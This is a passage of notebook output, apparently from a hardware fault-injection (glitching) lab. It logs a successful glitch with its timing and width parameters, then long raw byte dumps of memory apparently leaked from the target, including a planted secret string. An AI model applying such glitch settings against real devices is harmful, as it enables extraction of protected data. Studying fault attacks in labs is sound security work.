       "HBox(children=(IntProgress(value=0, description='ext_offset', max=3, style=ProgressStyle(description_width='in…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Glitched!\n",
      "\tExt offset: 16993\n",
      "\tOffset: -37.890625\n",
      "\tWidth: -7.03125\n",
      "r0\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "6720736265747267206762206f686c207a767978210x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x00Don't forget to buy milk!0x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x0080x01@0x000x960x00"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x000x000x000x000x000x080x000x000x000x080x0080x01@0x00D0x00@0x0080x01@0xFF0x010x000x000x010x000x000x000x010x000x000x000x000x000x000x00N0x000xD40x060x010x000x010x000x860x060x000x000x070x000x000x000x840xFF0x0B0x000x120x010x000x010x000x000x00@0x830x040x110xDF0x00\"0x010x020x030x010x000x000xB80x010x00 0x120x000x000x00 0x010x00 $0x000x000x000x040x030x090x040x010x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x00"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x00"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x00"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x000x00"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x990xA20xC70xC80xB8Y0xC10xAF0xB8U0xA7$0xD8i0xAB{0xD80xAFg0xAB0xA20xD3(U0xB0S[0xBEm0x8E0xDF0xAB0xE2i~_*W0xCA0xC10xD3rC0xA290xAFW0xAA0xEAu0xF60x15Q0xBAW0x820xBA0xDD0xA3u0x970x140xABq0xD7,0x07h0x160xBDP`0xAE]`0xE50xA80x050xB6>0xBD0xA2D0xEE0x98s0xBE0xF60xEC{50xA7U0x0E0x140x860xE8W0xAC0xF3x0x1DfuS0xA8wxd0xAF_2R}0xEEyq0xAA70xE30xBA0xA7:$0xFC0x12y"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "]0x8A0xC40x980xD70x0BXU0x0E0xE90xFCT0xAAQ0x8Ba`0xBC0x1D0xD40xA2}0xA00xA20x94:0xDB0xEE0x11j_=)U0xBF|0xF2|/0xBCV0xB60x15(Q0U0x960x12][[0xDA0xF20x15F0xF80xEB(_0xA0F0x0B0x9F]0xEA5zlJ0xF7_0x98O0xEA10xA90x010xAA0x190x95\n",
      "0xF80x140xEC0xC90xF60x14T0xC0To0x170xB8UTf0xC10x02v0xA780xD4#G0xFAT0xBED0x02Uuz0xC60x130xADQ0xB6D0x0F0xE60xB4,0x090xA2q0xFD"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[,U0xA10xD00xDB0x9510x8B0xDD0xF55*U0xD90x13-0xB9Q0xD10x150xAC0x15\n",
      "0x8D0xDC0x80Duz0xF5>0xE9~0xBCc0x08e0x8A}0xCC0xAF0xB90xE3\n",
      "n0x180xCAbW0xBA0xDE0xECthU0xDCnu0x830xA9Q0x0BW0xA90xF1'0xBC0xC8jD\"0xCA0xF50xA70x900xA30xFD0x8E0xF70x970xEC0x1E0xBE0x140xAA0x050xAA0x96i0xAEu_0xEB0x170xBA0x0E0xE50xAB0xD50x8F0x8C0xAB0xF40x8E0xA990xFB0x9C0x88]0x820x9F0x1D0x890x140xA9O0xA30x190x15_0xC180xABT0x8A"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Y0xD510xB2U0x8D0xA50xB3w0xA80xB12o0xED0xDF0xE2\"&0xAFA0xAAU.K0xA90xCDeK0xD80xACNjm0xFB0xF6YiC0xAAY0x000x950xF5hQ0x870xAAU0xEAk0x1C0xA3T)!0xF7\"0xA00x88O'0x070xE9_+0A;C0xBES0x03O0xBB0xEA0x130xEA0xD50x16*U0xAA0x920x10XT\n",
      "x0xBA20xD380xED0xB00xA10xEEb2 0x190xEA[0x9A0x0FxX>0xBA~0xF60x830xFA0xAA]0x05>0xFC00xC3)|0x980xA10x7F0xE4Q0xEB"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Q0xA4D0xAA}0x8C0xA8A0xA30xC50x170x8A0xCC0x940x93T0DB0x1D0xA0ED0x8B0xF50xC00xC70x82d0xAA0xAE0x070xCCfj\\0xEAZY6]0x920xA0V0xAA]r0x9A0x990xADp0x020x03\"0xF2S0xE20xC50xBA0x1E0xAA0x120x9E*0xC40x82v:0x910xAE0xEA0x000x8A0xA1&0xF00xF40x1A0xA6D0x800x810x8EI;W0xE3je0x030xDF0x8A0x110xFF0xBFr\n",
      "_?rkM72l0xC90xFB|0x0B0x970x01z0xC30x980x110xB5M0xC30x0B0x050xCB0xD60x1Bw+0xA50x05"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0xB50x1F0xA90x9D0xE60x1D(0xD50xBB0xACr0xAE0xD30xA0T0xEAG0x850x9B.0xC30x98D+50x110xA0.0xA20x7F0xA5f0xA60x8D`0xAE0xF00xEBA\n",
      "0x15m0xAA90xBF0xC1r?0xA60xEDS?0xF70x1D0x92y0xE60x180x040xE8W0x820x00b0xBEV0x080xB50xAA0xD10xE0~60x810xC4:^0x80Y0x18PDHU0x1Aj0xD50xAC4q0x090x1D*0x9C0x92O0xE40xFA0x130x8AM0xAAT0xAA0x140x11o]0x820x900xCA0xDD0xA20x8A0x830xCE0xB6W0xAC0xD7*&0x150x810xD60x80M"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "E0xAB0xEA0x1D0xEC0x8B0xAE0x8E0xE60xEC0xF80x8C}0xAE0xE50xFAp0xB00xA80xF20x82q0xA1T0xC20x95e0xD90xCAA0xA4}0x8B0x1D0x840x0Eh.0xA60xD9U0x09*Tx0x95;\\0xB10x1C3j@0x880x150xAA%\n",
      "0x81a0x0FM?0xE9Q0x180xAAU0xFAE0xAE^k0xB00x17\n",
      "|0xE4e>0x0E0x8A.;0xCA!0x8Bq0xA8E0x110xB60xF1*b0xA40xABe20xA6|0xABV*0xD70xA30xA2_0xB60xD00xB60xD90xDFM0x980xBBW?I0xCEU0xF20x880xA70x1B0x19u"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x060x88oNt0xC90x1BO0x120xC10xAF0xC70xA8j0xE9(D0x1A0xD00xC80x14<0xCB0x180x9E0xE90x05owQ0xA80xEE0xA2<n0xDD8,ekQ0x0EO0xB8T0x7F0x8A0x010xCCU0x000x110xAC?0x870x00\\0xED>u0x920xC0<&0x870xAD`0xF20xF50xD40xAE0xF40xC70xF50xF90xD2>0xE4s0xBE0x1D*0xD6a0xB5s0xE2e0xBDc0xE70xBA0x0DE0xE60x1C0xAAq80xD50x9A0x880x950xB4|0xB30x1A0x87/S0x0EQ0xAA0xD8+U0xC20xCAG0x8A0xFBq0x0F0xD30x8A0xFA0xD5"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0xAB0xB80x170x82U10x030xCD0x120xDB80x810xC9:u0xAE0x010xE20xD50x82{d0x880xD70xB0x>A0xAA0xE8]0x8BP0xBD(w0x110xB9@0xC00x1D0xAA0xB4@0x12g0xCAE0x88B0x960xDF0xBA0x92Q0xAC0xA50xB60xD0.%0xB50xE80x9D0xAE0xAFAn0x110xC00xA80x030x020xBE0x800x9D0xE80xFA0xC40x8A0xD10xBEH0x83uE0xA0c0xEC0x150xB30x150xBA0x08A*]0x91*}0xF30xB30x7Fjv0xAA0xB90xFDUr;0xF4._0xAC0xCF0xD6XA0x88E ]0xAE0x1750xAD"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0xD50x850x050x00Q0xAA0xF50xA80xDC0x8D0xEF0xD0=0xD60x7F0xA0+\\0xA5Ea0xDCsU0x070xEA0xB10xAE{0x82v0xEC0xAB0xD7 0xF40x8C@&U0xF50xCF0x050xE4:P0x880xD5t0xC80x840xBD90xC30xDA0xAC0xA80xD60x8E\\0xEAR3eu0xBA0x990xA2{0xF0U*0xBBt0xD9`^*v0xBA0xAE0xB90xE20xE50xA7U0xE0u0xD70xFF0xF40xB30x830xAEB0xE20xCF0x070xAE0x170x990x810xBA0x9AQ0xA5<0x9E0xBB0xDD0xDA0x11g0xE30x14~0x020xFC%$j0xC10xA4T0xC00xF5{"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x000x00'0x030x000x080x8B0x0D0x8B0x950x000x000x080x000x0F0x000x000x000x010x000x000x000x000x000x00H0xC4/0x00 0x140x00\n",
      "0x000x000x100x000x000xBF70x0C0x000x0C0x010x00 0xE0/0x00 0x9B:0x0C0x000x880x130x000x00c0x0F0x000x080x880x130x000x000xDF/0x00 0x010x000x000x000/0x000x000x940x000x00 0x010x000x000x000xE40x000x00 e0x040x000x080x080x000x000x00@0x000x000x000x010x000x000x00m0x020x000x080xAD0x010x000x080x000x000x000x000x000x000x000x000x000x000x000x000x00"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x950xAAp0x950x120xDD0xA8N0x830x940xF80xBA0xA70xAA0x18W2U0x170xB00x0F+Dy<0xB80xA7]0xBF[0x97)0xAEX0xE50xA2=0x8A0x100xB00x9180xA50xF7:DQ(70xAB0xA1AZ@0xA60xFF0x910x18u0xA2Q0xDAi0xFBU0x9AkQ0x920xD00x8A0x160xB2PW0xEB10x100xF2U0xCAY0x170x94OX0xBC0xBAW0xA8z0xF70xFA0xB10xFA0xDF0xF70xB40x130xDFS,0xDB0xBCI0xBC0x9BO0xBB|V0x9At0xDA@0x130xC4U0xC980x9A0x0550x9B0xDF0x940xD1"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5bNB0xB6}ZR0xABUJu0x950xF70xC7*-0xAA0xF50xA90x1B0xBE0xEB*4\"|0xAF0xB0-*0xC7+u0xE30xD4{-S0xD60x1D0xE00x930xD30xAF00xFB0x100xCAE0x86>N:W0xBC0xE3`.0xDD0xC7\n",
      "0x190xAA0xB00xAB0x85L0xA2o0xBAY0xB9u0x8F0x0CU30x050xACQ0xB3_0x8A0x1D0x110x8F0x080xDBnu0x82\\U0xAB0x810xA80x100x0C0x150xF6@%x]0xB1f0x8A0x9C0xD40xA2q0xA8U2U}u0x93b0xB2u*70xF60xA6K"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "*0x910xFD0xA670x920xEB]0xFB0xD50x15y0xF3hGf0xE50xA90xB7}0xE2q0xA60xDD0xA4uT0xAA0xD0w]0xAAT0xD20xA80xEF0xC0vD0x820x140xBA0x98@0xE20x9A0x12U0xF2X0x110xAAf S0xCD0xC10xC80xE3Q0xE80x900x800x1D\n",
      "RC0xEFI0xF20xA3W*Tu|40xC0M*Q;0xAD0x7F0x980xD9{e0x900x7FYHV0xA9]0xAE0x91*0xC9d0x9A[V*\\*0xEE0x1C0x880x0D9W0xDE0xDE0xD970xD60x980x1DkT0x8A0x8A;0xCE@0x8A"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x8CD0x96m0xE50xE80x17.Unu0xB8.N0x08)0xA8Q>0xE1|*-0xAF0xC80xD30xB40x150x080x1B0x140x000x890x930x0C0xEB0x89U0x880xD20x08S0x9C0x990x0C&0x1DIV#0xDD0x02j0x170xDEXU0xCA]K0xE1^ EJT0x8F0xDD0xD5n0xE90xC3V0xA20xDDKv0x83MY0xAF0xC5k0xFD0x950xF2m0xA90xEEQ0xBAA\\0xDEf0x80^0xB00x100xE30xBAU 0xE4:0xF80xE8 0xFD:A0xA80x180xBAD0xA0890xCEI0x910xEB0xD30xB20xAC0xF30xAB"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "}0x91R\\0x80p*0xFEE0xCA[l0xC5\"0xB7\\0xEA0xF10xB20x970x8A0xD50xFE0xFD0x980xDAU0xF1PU\n",
      "0xB8RB0x01(0xB0(0xD90x990xAA0x110x880x010xA0'0xAA0x010xF4+0x080xCA1ZP0xC70xA6V0xC1;0xD70x88L20xDBDB0x0D0xAA0x050xE6;0x0D#W80x0D0x9FO5>].]K%0xAB0xBFWo+u`U0;Td0x100xBA0xFC0xEF0x140x7F0xF20xEFd[0x8B|0xEC0xDCn,,0xB80x87\"U0xFCn$0xA60xB30x9C0xEA0xD0"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "C0xFB0xCA0x87y0x060x0B+jq0xCFGx40x0DEJ0x020x8Afj0xF29r0xBA0x80EcxQ0x090x170x95;0x080x96G2G0x8B0xCB70x030x15P0x1F0xDD0x05U0xDA0xBE0x830xF2z:0xCB0xAD^0x130x91U0xE80x020xAA0xE80xF00x05bM,0xB50xDEv*&0xC6:0xB80xA80xE90x16}0xC8i0x7F0xE3SxIk0x98*0xEB0xAF0x990xCA+C0xD4Y70xDB0xCD0xF70xF40xBA0xB90xB20xEB0xD90x8D0xA9duMeu0x040x01E0x150xAEL):0x060x0E"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0xFC0x17A0xDC0xBC0xB20xCAH0xFA0xAAc0xA20xC10xDE0xFB0x1D0x1FEa50xAB0xDAj0xB3f0xC40xA3)0x0D0xE40x950xE50xECm,0x040x8A0xE80xB3 40xAA0x1E/vSMQ0x140xDE]M0xB20xBC0xEA0xEC0x870x1A:0xA90xC50xF2o0xA3V0xD9=l0xE20xE8)0xA80xCE0xE10xEC0xACHT0x84]LU0xF4z0x8A0xFF0x84k\n",
      "0x020xA1z0x8C0x1C0x0F0xFAQ0x1DQ0x1C0x8E,0x8F(E0xD70xD5R0xB4^0xB20xCA0xD90xAA0xBA0xE20x110x040x1Cy0xD500x15-0xE7(0x9B0xA30xCBb0x8CVgqYUG@U_>0xE20xAF0xCA(0xBC0xBA0xFA40xF50x190x9Ca0xD50xA50x14 0xAE<0xBF0xE20xAD"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0xBBL0xD4\\0x1A0xBB0xD90xFD0xF90x9Ck>0xE90xAA0xAA0xBA0xC90xE40xA10x99U]0xEC^Q0xAC0xAA0xBA0xA20xDA0x0E0xDA0xB2Wr0xEFy60xD10xC4T^0xA10xA6m0x8A0x1A0xE30xCE0x83[QGI0x0FG0xD50x830x830xCA0xA20xC5(0x8C0xFD0xF80x1E0xBA0xA5P*0xAB0xD7U0x0270xC5,9\n",
      "W0xB40xE90x080x8F80xEA0xB50xEE0xF50xDCPL{w0xF5U0xAB0xEF0xBF0xE80xFBx0x12>0x830xED0x1E0xDD0xFC0xD4p{0xEA^0xD00xA30xF30xA8~0xAAwaX0xC0jk"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0xB20xAE0xA20xAB0x880xA30xAE0xAEQ-?0xD9a#10xD5*)0xF80xED>0x020xE20x8A~\"0xC5$5YBC30xF80xAF0xEC0xC40x040xAB;0x150xD5{W0xA00xAC0x83jqw0x8E_0xC50x11e0xCC)N\"0xEC0x840x98l0xCE0xE40xC40xADf<0x910xD40xF5.0xA00xA80xA00xAA0xAA0xEC:0x9B0xBDLNGGXd0xAB;0xAD0xA2&0x8E0xAF0xA10x1C\\0xD60x17w0xF5T}0xB40xBA\\0xA00xC1EU0x110x830x050x9D0xBA0x090xA00xE00xAE0x0D0x85A0x10@0x110xF4"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0xCC0xA9e0xEAMHu0xB2OUoA0xED;k0xA80xD80xD40xEA90xC10xD00x0C0xD8\\PAM0xCC\"`0x8E0xBE0xC7Z0xA90xDCLDO40x0CU0xE380x9FE0xCA0x88,0xAF0xA3T0xF50xA7-0xE0.0xE8R0xA3}y0x9D0x140xB10x140x150xE30xA1x0xFB#0xE90x9C0xA15E0xF50x1C0x0D0x15s0xD4K60xBB0x8E0x0F0x910xB60xE80x19E0xFF+0x11f0xF5\\0x190xB00xAAz0xA00xBA0xA6nv0xD9M[tU0xDE0x940xAA0x980xDA#@0x87`\"0xA30xA40x0B0xC90x82(:0x9D0x97e70xD60x0EQ0x120xB60x9E0xAC/(0xAB0xC00x870xF9}0xBC0x9D0xF4SWT0xA60xC00xB2B0xDB0xF6MU0xFD0xB60xDA:0xE2j0xBB0x8B|30x990x1B0x90p][0x130xA80xAB~f\n",
      "80xAAA0x040x950xB3tH60xC80x9C0xCB*0x9A0xD20xF2*0xE3@0xD5@0xC1QdMA0x9B0xE00x8F0xE80x17;*"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x0D0x9E0xFB!0xB4+]0x190x1DV0x7F0x1740x1470xA60xBC0x0E0xAC*0x910xE2z0xF90xF50xDC0xBE) 0xA20xD730xC50xCD0xF5G]k0xB60xB20xC20xEA0xB8#0xEE0xAAt_0xFC0xD90x840x0Dv0x010xA20x0F0xEE0xC10xEEW0xEA0xA00x7FQ0xC050xA50x0D0xDE@a0xAB0xCA0x980xAB0xBA0xBA('0x170xD2MU0x15P0xBF0xA70x920x900xA8PUR0xD5j0x920xE0_jj0x8B0xEBjuE0xFE0x15P50xF5'0xECk0xFA0x040xF8\n",
      "0xEF0x1D0xD50xED0xED0x06|V0xD60xE2"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "e0xEB0x8A0x9AI0x840xDC0xA00x860x810x950x810x06%f)0x05'0xAA0x8B0x0E0xA8\"*0xBA0xF3{0xC3]0xC3VoD0x960x1A0xA5l0xCA0x8Ao0x820xD1\\g0x07U0xD40x1F0xD10x15Hz0xA30xC5UU0xC20xEC0xBE0xAB0xAE0xBA0xAC0xAA0xEBi0xA4>0xC10xCDT0xE1Q/0xF80xF80xA30x8E.0xCF0xCA0x950xF4]0x150xF5uFU0xA50xEE0x8E;0xF00x7F0x820xA10xF7T0x93Q<qT0xD30xB6)>*0xA80xF60xE4OEEwGh0xBA0xBE:m0xED0xD40xAA0xB70xC5"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "M.0xA90xB00J0xDD0xD0=0xC5@0xD40xC3N0xDE0x980xC30xCE0xD20x9E0x8A0xCAQP0xC10xDA0x950xC30xFB0xF10xA30xAA0xFB90x1A0xE3sb0x950x87[F0x050x1F<0xC50xBE0xAA\n",
      "g0xA8>0x080xAA0xF40xCAA0x91GZ0x110x150xA80xCA)0xB2EU0x16u)0xAA0xBA0xAA0xE2+0xFC0xAFU0x160xED-e0x0FT0xB710x9E0xF40xAA0xBE\n",
      "0xA7B0x1DD0xF5u0x9ARpY0x8A0x1F0xF2l0xCA0xA30xA70xACP0x050xF7%M0x0C0x150x14Z0xC80xAE0x8A\"*0xA20xEB0x15"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+0x1B*0xFF0x000xD3y0xFEYqv0xEEb0xB3j0xEA0xF80xE9FFQ0x8C0xD10xDAU0xCF0xD40xEA0xA90xCA>0x880xB80x8C0xAA"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0xA40xAAULwmOWYu0xEB0xE7{0xAE0x980x950xFA+0x01R0x9D0x1550xC30xD00x9D0x04b0xBA0xA70x060x8320x920x060x8B:T|0x170xD40x7F.0x8A0xB20xF90xE6c0xD2:EwTU0x18P0x18{0x080xB80xB0sPU0x86Sp0xA00xE2iN!0xA8w\\E0x80}W0x010x090x910xAA0x86[*0xA8k0xEB0x860xC4T0xD1f0xFCqm0x15:0x12(20xE60xBF0xA1v70x110x01u0xC60x071S0x8E0xADK0x880xAA0xA90x1A0x9B0x9Em]0x9D0xBB"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "LEuq0x0Dk\")0xAE0x8F0xAB+0xB0%0xF3o0x150xCB0x8A0xA80xA90xDC0xDD0x80`0xD70x95S0xE90xA90x980x020xAA0xA3~10xB8$0xF50x970x95V@0xDF,0xA2F0xEE0xBCZB0xA40xE80xB4y0x15M0xB1[W0x1F%0xEB0K0x930xE30xA3/5r0xB510xD5w0x12u0xE60xE60xB65A0xC5P_0xEC0xE9x0xFE0x080xF80xA5rH0xFDuV0x14N6g0xBA0xEE*0x8F0xAC0xA90xAB0xE90x90d.0xD1y0x9D0x91<=0xBA30xEF0x040xF90x8E0x070x050xCA"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x170x800x1C>0xBE0x8A0xBD0xBB0xF20xAD0xB10x01qQ0xE50xCBa0x8D!0x860xA80xCE0xAB0xD70xF00xB0+0x120xF00x12y0xAC0x8A0x830xA8N0xDB_U=0x05Eq0xEA0xA20xDA0x170xEA0x020xE9j0xECG0x7Fa0x150xD3H0xCF0xEC0xA2rk`:0xE80x80L0x150xB30x150x11U\\0xC90xAA0x01\"0xCA0xB3`>0xCASTL0xF70x15{Q0xD52y(0xE4G0xDE0x91T@n92+\n",
      "0xAA0xF0d0x14XQX.QQ0xEA0x9E0xEA0xD00x020x9A0xEB0xB7B0x910xDB0x91"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x0E0x950xD70xF10x190xA90xBE0xE20xAB0xF10xBF +0xF50x9F0x82I]0xD50x86C20xA40xA8+0x9E\"0xCC0xBE0x960x94@G0xD3rOS0xAE0x840xEC#0xA20x0C0xAA0xA2}H0xDC0x07TG0xA30x04/0xAA0xA20x1E0xF3JZ*0x96sW50xED0xAC0xAE0x96G0xCDJ0xD5Uw0xD60x070xA80xAB0xBA0x080xCD0xA30xBA0x100xD1AHTA0xD30x05t0x8E0xBA0x0270xF9Gw%eW0x1D-0xAB0x070x0B0x0F0xC10xC20x1F_0x15rT0x8D|]0x070x8FVj.*m0xBE0xCESQ\\!-0x97{e\n",
      "0x810xEFcdT0x020xD10xC2!0xE60xAB~0xA9\"0xAE0x1D0x810x880x87O0xE4a0xC30x9B"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x14\\<y$wT0x8A0xA80xB70xF20x81j0x920x920x010xDCU0x90U0x140x14q0x860x9C0x890xB90x830x8E0xA60x9EG0x0D0x910x1F0xAB0xCA0xA70xBA;_e0x10E\\]0x070xBB:0xF8\n",
      "0x8D0xC0)0x8A0xCCFIG0xCCm]0x04(jX0xAD0x80N>0xAA0xC60xDCuK0xD80x17O0xAE0xB20xAE0xAC0xAA0xA9r0xBB0x8A0xAB0xD9QP0xF4C}W)0xCB{0x12EDY0x1Eh0xC60xEA0xAB0xAD0x8EB0x8Ct0xC5B0xE40x11PW0xCC0xAA0xE00xE0n0xE9*h0x9D"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
